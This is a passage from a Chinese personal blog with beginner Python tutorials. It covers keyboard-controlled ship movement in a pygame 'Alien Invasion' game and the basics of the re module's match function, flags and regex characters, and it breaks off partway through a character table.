<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="comment"># PingMuXianShi是文件名，XianShi是PingMuXianShi文件里面的类名</span></span><br><span class="line"><span class="keyword">from</span> PingMuXianShi <span class="keyword">import</span> XianShi </span><br><span class="line"><span class="comment"># 导入ship文件里面的ship的类</span></span><br><span class="line"><span class="keyword">from</span> ship <span class="keyword">import</span> Ship</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入game_funcltions文件</span></span><br><span class="line"><span class="keyword">import</span> game_funcltions </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">game</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建对象</span></span><br><span class="line">    xian_shi=XianShi()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建一个窗口，都有XianShi类里面的width和height</span></span><br><span class="line">    screen=pygame.display.set_mode((xian_shi.width,xian_shi.height))  </span><br><span class="line"></span><br><span class="line">    <span class="comment"># 窗口的名字</span></span><br><span class="line">    pygame.display.set_caption(<span class="string">&quot;外星人入侵&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建一个飞船</span></span><br><span class="line">    ship=Ship(screen)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 死循环</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 用game_funcltions文件里面的check_events函数 点击窗口的关闭</span></span><br><span class="line">        game_funcltions.check_events(ship)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 调用ship文件里面的update方法</span></span><br><span class="line">        ship.update()</span><br><span class="line">        <span class="comment"># 用game_funcltions文件里面的update_screen绘制图形</span></span><br><span class="line">        game_funcltions.update_screen(xian_shi,screen,ship)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">game()</span><br></pre></td></tr></table></figure>
<p>里面添加了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 调用ship文件里面的update方法</span></span><br><span class="line">ship.update()</span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<p>![2021-03-19 16-53-40](<a href="https://cdn.jsdelivr.net/gh/wzass/zp/2021-03-19">https://cdn.jsdelivr.net/gh/wzass/zp/2021-03-19</a> 16-53-40.png)</p>
<h2 id="左右移动"><a href="#左右移动" class="headerlink" title="左右移动"></a>左右移动</h2><div class="note info simple"><p>上面的他只可以右移动，像对应的还有，按左键事件<code>K_LEFT</code>我们用这个事件就可以叫他向左移动</p>
</div>

<p><code>game_funcltions.py</code>文件代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 监听键盘和鼠标的事件</span></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">check_events</span>(<span class="params">ship</span>):</span></span><br><span class="line">    <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">            <span class="comment"># 点击窗口的关闭，就会检查到pygame.QUIT然后退出循环</span></span><br><span class="line">        <span class="keyword">if</span> event.type==pygame.QUIT:</span><br><span class="line">            sys.exit()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 监听建键盘的建，如果你按键盘了他是会被执行</span></span><br><span class="line">        <span class="keyword">elif</span> event.type==pygame.KEYDOWN:</span><br><span class="line"></span><br><span class="line">            <span class="comment"># K_RIGHT这个就是我们键盘的右建事件如果我们点击和松开了下面就会被执行</span></span><br><span class="line">            <span class="keyword">if</span> event.key==pygame.K_RIGHT:</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 就会叫这个ship.moving_right属性设置为True</span></span><br><span class="line">                ship.moving_right=<span class="literal">True</span></span><br><span class="line">            <span class="comment"># K_LEFT这个就是我们键盘的左建事件如果我们点击和松开了下面就会被执行</span></span><br><span class="line">            <span class="keyword">elif</span> event.key==pygame.K_LEFT:  <span class="comment"># 新加的代码</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># 就会叫这个self.moving_left属性设置为True</span></span><br><span class="line">                ship.moving_left=<span class="literal">True</span> <span class="comment"># 新加的代码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 我们按键松开就会检查到KEYUP事件，下面的代码就会执行</span></span><br><span class="line">        <span class="keyword">elif</span> event.type==pygame.KEYUP:</span><br><span class="line"></span><br><span class="line">            <span class="comment"># K_RIGHT这个就是我们键盘的右建事件如果我们点击和松开了下面就会被执行</span></span><br><span class="line">            <span class="keyword">if</span> event.key==pygame.K_RIGHT:</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 就会叫这个ship.moving_right属性设置为False </span></span><br><span class="line">                ship.moving_right=<span class="literal">False</span>       </span><br><span class="line"></span><br><span class="line">            <span class="comment">## K_LEFT这个就是我们键盘的左建事件如果我们点击和松开了下面就会被执行</span></span><br><span class="line">            <span class="keyword">elif</span> event.key==pygame.K_LEFT: <span class="comment"># 新加的代码</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># 就会叫这个self.moving_left属性设置为False </span></span><br><span class="line">                ship.moving_left=<span class="literal">False</span>   <span class="comment"># 新加的代码            </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_screen</span>(<span class="params">xian_shi,screen,ship</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 填充颜色 ,用的是PingMuXianShi文件里面的XianShi类的gb属性</span></span><br><span class="line">    screen.fill(xian_shi.gb)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 绘制飞船</span></span><br><span class="line">    ship.blitme()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 绘制屏幕可见</span></span><br><span class="line">    pygame.display.flip()    </span><br></pre></td></tr></table></figure>
<p><code>ship.py</code>文件增加左移动值代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ship</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># screen用于传参数</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,screen</span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 叫screen穿的参数给self.screen</span></span><br><span class="line">        self.screen=screen</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 去哪个目录加载图像返回值给了self.ima</span></span><br><span class="line">        self.ima=pygame.image.load(<span class="string">&#x27;/home/zss/笔记/外星人入侵项目/ima/ship.bmp&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 获得外部矩形</span></span><br><span class="line">        self.rect=self.ima.get_rect()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 屏幕矩形</span></span><br><span class="line">        self.screen_rect=screen.get_rect()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># centerx这个英文是中间的意思，就是叫图片放到中间，这个就是x轴，他还有一个y轴</span></span><br><span class="line">        self.rect.centerx=self.screen_rect.centerx</span><br><span class="line"></span><br><span class="line">        <span class="comment"># bottom英文是底部的意思，就是叫图片放到底部</span></span><br><span class="line">        self.rect.bottom=self.screen_rect.bottom</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 右移动标志</span></span><br><span class="line">        self.moving_right=<span class="literal">False</span></span><br><span class="line">        <span class="comment">#  左移动标志</span></span><br><span class="line">        self.moving_left=<span class="literal">False</span> <span class="comment"># 新加的代码</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># game_funcltions文件里面有键盘监听事件按键按下去就会吧这个属性设置成True</span></span><br><span class="line">        <span class="keyword">if</span> self.moving_right:</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 这个就给x加1</span></span><br><span class="line">            self.rect.centerx+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># game_funcltions文件里面有键盘监听事件按键按下去就会吧这个属性设置成True</span></span><br><span class="line">        <span class="keyword">if</span> self.moving_left:  <span class="comment"># 新加的代码</span></span><br><span class="line">			</span><br><span class="line">            <span class="comment"># 这个就给x减</span></span><br><span class="line">            self.rect.centerx-=<span class="number">1</span> <span class="comment"># 新加的代码</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建一个blitme类</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">blitme</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 在屏幕上绘制图形</span></span><br><span class="line">        self.screen.blit(self.ima,self.rect)</span><br></pre></td></tr></table></figure>


<p>运行结果</p>
<p>![2021-03-19 17-12-42](<a href="https://cdn.jsdelivr.net/gh/wzass/zp/2021-03-19">https://cdn.jsdelivr.net/gh/wzass/zp/2021-03-19</a> 17-12-42.png)</p>
<h2 id="设置飞船的飞行速度"><a href="#设置飞船的飞行速度" class="headerlink" title="设置飞船的飞行速度"></a>设置飞船的飞行速度</h2><p><code>game_funcltions.py</code>文件代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ship</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ai_settings传输飞船移动速度screen用于传参数，</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,ai_settings,screen</span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 叫screen穿的参数给self.screen</span></span><br><span class="line">        self.screen=screen</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 添加self.ai_settings叫</span></span><br><span class="line">        self.ai_settings=ai_settings</span><br><span class="line">        <span class="comment"># 去哪个目录加载图像返回值给了self.ima</span></span><br><span class="line">        self.ima=pygame.image.load(<span class="string">&#x27;/home/zss/笔记/外星人入侵项目/ima/ship.bmp&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 获得外部矩形</span></span><br><span class="line">        self.rect=self.ima.get_rect()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 屏幕矩形</span></span><br><span class="line">        self.screen_rect=screen.get_rect()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># centerx这个英文是中间的意思，就是叫图片放到中间，这个就是x轴，他还有一个y轴</span></span><br><span class="line">        self.rect.centerx=self.screen_rect.centerx</span><br><span class="line"></span><br><span class="line">        <span class="comment"># bottom英文是底部的意思，就是叫图片放到底部</span></span><br><span class="line">        self.rect.bottom=self.screen_rect.bottom</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 启动是保存飞船的第一个位置float是转换小数的意思</span></span><br><span class="line">        self.center=float(self.rect.centerx)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 右移动标志</span></span><br><span class="line">        self.moving_right=<span class="literal">False</span></span><br><span class="line">        <span class="comment">#  左移动标志</span></span><br><span class="line">        self.moving_left=<span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># self.moving_right在game_funcltions文件里面有键盘监听事件按键按下去就会吧这个属性设置成True</span></span><br><span class="line">        <span class="comment"># self.rect.right获得外部矩形位置</span></span><br><span class="line">        <span class="comment"># self.screen_rect.right记录长度</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 新加的代码</span></span><br><span class="line">        <span class="keyword">if</span> self.moving_right <span class="keyword">and</span> self.rect.right &lt; self.screen_rect.right:</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 这个就给x加self.ai_settings.ship_speed_factor,这个文件在PingMuXianShi文件里面</span></span><br><span class="line">            self.rect.centerx+=self.ai_settings.ship_speed_factor</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 新加的代码</span></span><br><span class="line">        <span class="keyword">if</span> self.moving_left <span class="keyword">and</span> self.rect.left &gt; <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 这个就给x减self.ai_settings.ship_speed_factor,这个文件在PingMuXianShi文件里面</span></span><br><span class="line">            self.rect.centerx-=self.ai_settings.ship_speed_factor</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#self.rect.centerx=self.center</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建一个blitme类</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">blitme</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 在屏幕上绘制图形</span></span><br><span class="line">        self.screen.blit(self.ima,self.rect)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>上面的代码介绍</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> self.moving_right <span class="keyword">and</span> self.rect.right &lt; self.screen_rect.right:</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 这个就给x加self.ai_settings.ship_speed_factor,这个文件在PingMuXianShi文件里面</span></span><br><span class="line">    self.rect.centerx+=self.ai_settings.ship_speed_factor</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> self.moving_left <span class="keyword">and</span> self.rect.left &gt; <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 这个就给x减self.ai_settings.ship_speed_factor,这个文件在PingMuXianShi文件里面</span></span><br><span class="line">    self.rect.centerx-=self.ai_settings.ship_speed_factor</span><br></pre></td></tr></table></figure>
<p>代码1</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> self.moving_right <span class="keyword">and</span> self.rect.right &lt; self.screen_rect.right:</span><br></pre></td></tr></table></figure>
<ol>
<li><p><code>self.moving_right</code>：self.moving_right在game_funcltions文件里面有键盘监听事件按键按下右键去就会吧这个属性设置成True</p>
</li>
<li><p><code>self.rect.right</code>：self.rect.right获得外部矩形位置，就是图像的位置</p>
</li>
<li><p><code>self.screen_rect.right</code>：# self.screen_rect.right记录长度，就是窗口的长度</p>
</li>
</ol>
<div class="note info simple"><p>self.screen_rect.right是1200，self.rect.right如果他向左移动到1200就是到了最右边了</p>
</div>

<p>代码2</p>
<ol>
<li><p><code>self.moving_left</code>：self.moving_left在game_funcltions文件里面有键盘监听事件按键按下右键去就会吧这个属性设置成True</p>
</li>
<li><p><code>self.rect.left</code>：self.rect.left记录右边框还下多少距离，如果是0就错误不执行 </p>
</li>
</ol>
<p>运行结果</p>
<p>![2021-03-21 09-10-02](<a href="https://cdn.jsdelivr.net/gh/wzass/zp/2021-03-21">https://cdn.jsdelivr.net/gh/wzass/zp/2021-03-21</a> 09-10-02.png)</p>
<h2 id="重构-1"><a href="#重构-1" class="headerlink" title="重构"></a>重构</h2><div class="note info simple"><p>现在发现代码已经很长了，我们可以给<code>check_events()</code>函数已经很长了</p>
</div>

<p><code>game_funcltions.py</code>文件代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">check_keydown_events</span>(<span class="params">event,ship</span>):</span></span><br><span class="line">    <span class="comment"># K_RIGHT这个就是我们键盘的右建事件如果我们点击和松开了下面就会被执行</span></span><br><span class="line">    <span class="keyword">if</span> event.key==pygame.K_RIGHT:</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 就会叫这个ship.moving_right属性设置为True</span></span><br><span class="line">        ship.moving_right=<span class="literal">True</span></span><br><span class="line">    <span class="comment"># K_LEFT这个就是我们键盘的左建事件如果我们点击和松开了下面就会被执行</span></span><br><span class="line">    <span class="keyword">elif</span> event.key==pygame.K_LEFT:</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 就会叫这个self.moving_left属性设置为True</span></span><br><span class="line">        ship.moving_left=<span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_keyup_events</span>(<span class="params">event,ship</span>):</span></span><br><span class="line">    <span class="comment"># K_RIGHT这个就是我们键盘的右建事件如果我们点击和松开了下面就会被执行</span></span><br><span class="line">    <span class="keyword">if</span> event.key==pygame.K_RIGHT:</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 就会叫这个ship.moving_right属性设置为False </span></span><br><span class="line">        ship.moving_right=<span class="literal">False</span>       </span><br><span class="line"></span><br><span class="line">    <span class="comment">## K_LEFT这个就是我们键盘的左建事件如果我们点击和松开了下面就会被执行</span></span><br><span class="line">    <span class="keyword">elif</span> event.key==pygame.K_LEFT:</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 就会叫这个self.moving_left属性设置为False </span></span><br><span class="line">        ship.moving_left=<span class="literal">False</span>              </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 监听键盘和鼠标的事件</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_events</span>(<span class="params">ship</span>):</span></span><br><span class="line">    <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">        <span class="comment"># 点击窗口的关闭，就会检查到pygame.QUIT然后退出循环</span></span><br><span class="line">        <span class="keyword">if</span> event.type==pygame.QUIT:</span><br><span class="line">            sys.exit()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 监听建键盘的建，如果你按键盘了他是会被执行</span></span><br><span class="line">        <span class="keyword">elif</span> event.type==pygame.KEYDOWN:</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 调用check_keydown_events函数穿event和ship参数</span></span><br><span class="line">            check_keydown_events(event,ship)</span><br><span class="line">        <span class="comment"># 我们按键松开就会检查到KEYUP事件，下面的代码就会执行</span></span><br><span class="line">        <span class="keyword">elif</span> event.type==pygame.KEYUP:</span><br><span class="line">            <span class="comment"># 调用check_keyup_events函数穿event和ship参数</span></span><br><span class="line">            check_keyup_events(event,ship)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_screen</span>(<span class="params">xian_shi,screen,ship</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 填充颜色 ,用的是PingMuXianShi文件里面的XianShi类的gb属性</span></span><br><span class="line">    screen.fill(xian_shi.gb)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 绘制飞船</span></span><br><span class="line">    ship.blitme()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 绘制屏幕可见</span></span><br><span class="line">    pygame.display.flip()    </span><br></pre></td></tr></table></figure>
<h1 id="射击"><a href="#射击" class="headerlink" title="射击"></a>射击</h1><h1 id="更新中…………………"><a href="#更新中…………………" class="headerlink" title="更新中…………………."></a>更新中………………….</h1>]]></content>
      <categories>
        <category>编程</category>
        <category>python</category>
      </categories>
      <tags>
        <tag>Python基础</tag>
      </tags>
  </entry>
  <entry>
    <title>python正则表达式</title>
    <url>/2021/04/21/pythonzhengze/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p><strong>爬虫学习记录</strong></p>
<div class="note info simple"><p>下面会用到到网站<a href="https://regex101.com/">https://regex101.com/</a></p>
</div>

<h1 id="正则表达式的函数"><a href="#正则表达式的函数" class="headerlink" title="正则表达式的函数"></a>正则表达式的函数</h1><p>python提供了一个<code>re</code>模块这个模块提供了很多的方法和函数</p>
<h1 id="match-函数"><a href="#match-函数" class="headerlink" title="match()函数"></a>match()函数</h1><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><div class="note info simple"><p>他的格式，他有三参数，这个函数会从起始位置进行匹配如果匹配失败就返回<code>none</code></p>
</div>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">re.match(匹配的正则表达式, 要匹配的字符串, 可选参数标志位控制匹配的比如是否区分大小写等)</span><br></pre></td></tr></table></figure>
<ul>
<li><p>正则表达式修饰符 - 可选标志</p>
<table>
<thead>
<tr>
<th align="left">修饰符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">re.I</td>
<td align="left">使匹配对大小写不敏感</td>
</tr>
<tr>
<td align="left">re.L</td>
<td align="left">做本地化识别（locale-aware）匹配</td>
</tr>
<tr>
<td align="left">re.M</td>
<td align="left">多行匹配，影响 ^ 和 $</td>
</tr>
<tr>
<td align="left">re.S</td>
<td align="left">使 . 匹配包括换行在内的所有字符</td>
</tr>
<tr>
<td align="left">re.U</td>
<td align="left">根据Unicode字符集解析字符。这个标志影响 \w, \W, \b, \B.</td>
</tr>
<tr>
<td align="left">re.X</td>
<td align="left">该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解。</td>
</tr>
</tbody></table>
</li>
</ul>
<h2 id="实测"><a href="#实测" class="headerlink" title="实测"></a>实测</h2><h3 id="匹配错误返回"><a href="#匹配错误返回" class="headerlink" title="匹配错误返回"></a>匹配错误返回</h3><p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>  re</span><br><span class="line"></span><br><span class="line">a=<span class="string">&quot;babc&quot;</span></span><br><span class="line">b=<span class="string">&quot;abc def ghi&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># a和b进行匹配，前面多一个b不匹配</span></span><br><span class="line">c=re.match(a,b)</span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure>
<p>结果：返回一个None</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210418085308715.png" alt="image-20210418085308715"></p>
<h3 id="匹配正确返回"><a href="#匹配正确返回" class="headerlink" title="匹配正确返回"></a>匹配正确返回</h3><p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>  re</span><br><span class="line"></span><br><span class="line">a=<span class="string">&quot;abc&quot;</span></span><br><span class="line">b=<span class="string">&quot;abc def ghi&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># a和b进行匹配</span></span><br><span class="line">c=re.match(a,b)</span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure>
<p>结果：匹配正确，返回一个对象</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210418084957128.png" alt="image-20210418084957128"></p>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>他进行是返回一个对象那么我们就可以用里面的方法了</p>
</div> 

<p>查看里面的方法可以用<code>dir</code>函数</p>
<p>可以看见有很多的方法</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210418090626506.png" alt="image-20210418090626506"></p>
<div class="note info simple"><p>下面我列出几个常用的方法</p>
</div>

<table>
<thead>
<tr>
<th align="left">常用的方法</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">group()</td>
<td align="left">返回匹配的字符串</td>
</tr>
<tr>
<td align="left">span()</td>
<td align="left">返回匹配的范围</td>
</tr>
<tr>
<td align="left">start()</td>
<td align="left">返回从那开始匹配的</td>
</tr>
<tr>
<td align="left">groups()</td>
<td align="left">返回全部分组</td>
</tr>
</tbody></table>
<ol>
<li><p>group()选择返回的字符串</p>
<p>实测</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>  re</span><br><span class="line"></span><br><span class="line">a=<span class="string">&quot;abc&quot;</span></span><br><span class="line">b=<span class="string">&quot;abc def ghi&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># a和b进行匹配</span></span><br><span class="line">c=re.match(a,b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出匹配的字符串</span></span><br><span class="line">print(c.group())</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">abc</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210418090829379.png" alt="image-20210418090829379"></p>
</li>
<li><p>span()返回匹配的范围</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>  re</span><br><span class="line"></span><br><span class="line">a=<span class="string">&quot;abc&quot;</span></span><br><span class="line">b=<span class="string">&quot;abc def ghi&quot;</span></span><br><span class="line"><span class="comment"># a和b进行匹配</span></span><br><span class="line">c=re.match(a,b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出匹配的范围</span></span><br><span class="line">print(c.span())</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(0, 3)</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210418091042017.png" alt="image-20210418091042017"></p>
</li>
<li><p>start()返回从那开始匹配的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>  re</span><br><span class="line"></span><br><span class="line">a=<span class="string">&quot;abc&quot;</span></span><br><span class="line">b=<span class="string">&quot;abc def ghi&quot;</span></span><br><span class="line"><span class="comment"># a和b进行匹配</span></span><br><span class="line">c=re.match(a,b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出从那开始匹配的</span></span><br><span class="line">print(c.start())</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210418091516259.png" alt="image-20210418091516259"></p>
</li>
</ol>
<h2 id="第三个可选参数标志位"><a href="#第三个可选参数标志位" class="headerlink" title="第三个可选参数标志位"></a>第三个可选参数标志位</h2><p>比如代码是下面这样的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>  re</span><br><span class="line"></span><br><span class="line">a=<span class="string">&quot;ABc&quot;</span></span><br><span class="line">b=<span class="string">&quot;abc def ghi&quot;</span></span><br><span class="line"><span class="comment"># a和b进行匹配</span></span><br><span class="line">c=re.match(a,b)</span><br><span class="line"></span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure>
<p>结果，应为他是AB和ab是不匹配的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">None</span><br></pre></td></tr></table></figure>
<div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>我们就可以用到参数标志位，不区分大小写</p>
</div> 

<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>  re</span><br><span class="line"></span><br><span class="line">a=<span class="string">&quot;ABc&quot;</span></span><br><span class="line">b=<span class="string">&quot;abc def ghi&quot;</span></span><br><span class="line"><span class="comment"># a和b进行匹配，添加上re.I不区分大小写</span></span><br><span class="line">c=re.match(a,b,re.I)</span><br><span class="line"></span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;re.Match object; span&#x3D;(0, 3), match&#x3D;&#39;abc&#39;&gt;</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210418091949404.png" alt="image-20210418091949404"></p>
<h1 id="字符的使用"><a href="#字符的使用" class="headerlink" title="字符的使用"></a>字符的使用</h1><table>
<thead>
<tr>
<th align="left">字符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">.</td>
<td align="left">匹配任意一个字符（除了\n）</td>
</tr>
<tr>
<td align="left">[]</td>
<td align="left">匹配列表中的内容（点就是点而不是如何字符）</td>
</tr>
<tr>
<td align="left">\w</td>
<td align="left">匹配字母、数字及下划线比如a-z，A-Z，_</td>
</tr>
<tr>
<td align="left">\W</td>
<td align="left">匹配不是字母、数字及下划线的字符</td>
</tr>
<tr>
<td align="left">\s</td>
<td align="left">匹配任意空白字符，等价于 <code>[\\t\\n\\r\\f]</code></td>
</tr>
<tr>
<td align="left">\S</td>
<td align="left">匹配任意非空字符</td>
</tr>
<tr>
<td align="left">\d</td>
<td align="left">匹配任意数字，等价于 <code>[0-9]</code></td>
</tr>
<tr>
<td align="left">\D</td>
<td align="left">匹配任意非数字的字符</td>
</tr>
<tr>
<td align="left">\Z</td>
<td align="left">匹配字符串结尾，如果有换行会往下匹配</td>
</tr>
<tr>
<td align="left">\A</td>
<td align="left">匹配字符串开头</td>
</tr>
<tr>
<td align="left">^</td>
<td align="left">匹配一行字符串的开头</td>
</tr>
<tr>
<td align="left">$</td>
<td align="left">匹配一行字符串的结尾</td>
</tr>
<tr>
<td align="left">\n</td>
<td align="left">匹配一个换行符</td>
</tr>
<tr>
<td align="left">\t</td>
<td align="left">匹配一个制表符</td>
</tr>
<tr>
<td align="left">*</td>
<td align="left">匹配 0 个或多个表达式</td>
</tr>
<tr>
<td align="left">+</td>
<td align="left">匹配 1 个或多个表达式</td>
</tr>
<tr>
<td align="left">?</td>
